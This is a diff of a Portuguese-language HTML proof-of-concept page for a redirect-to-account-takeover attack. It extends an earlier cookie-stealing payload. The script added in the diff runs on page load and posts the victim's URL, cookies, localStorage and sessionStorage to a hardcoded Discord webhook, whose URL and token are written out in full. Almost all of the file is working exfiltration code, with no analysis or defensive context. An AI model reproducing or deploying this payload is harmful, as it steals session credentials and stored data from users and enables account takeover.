@@ -1,22 +1,28 @@
 <!doctype html>
-<html lang="en">
+<html lang="pt-br">
 <head>
   <meta charset="utf-8">
-  <title>PoC XSS</title>
+  <title>PoC redirect → takeover</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace">
-  <h1>✅ PoC carregada – verifique o canal Discord</h1>
+  <h1>✅ Exploit carregado – dados enviados ao Discord</h1>
 
   <script>
-  /* dispara 1x ao carregar */
-  (function(){
+  /* dispara 1× ao carregar */
+  (async () => {
     const hook = "https://discord.com/api/webhooks/1475603098755010713/iK731ADXTEvlJfl1vB1o14svZqceCF4-sG2F-mc-2zazbDcJbItR8ifFnEOTMAFSDj3Y";
-    fetch(hook,{
+
+    const data = {
+      url: location.href,
+      cookie: document.cookie,
+      local:  JSON.stringify(localStorage),
+      session:JSON.stringify(sessionStorage)
+    };
+
+    await fetch(hook,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        content:"🍪 Cookie capturado\n```\n"+document.cookie+"\n```"
-      })
+      body:JSON.stringify({content:`🎯 ${data.url}\n🍪 ${data.cookie}\n💾 local:${data.local}\n📦 session:${data.session}`})
     });
   })();
   </script>
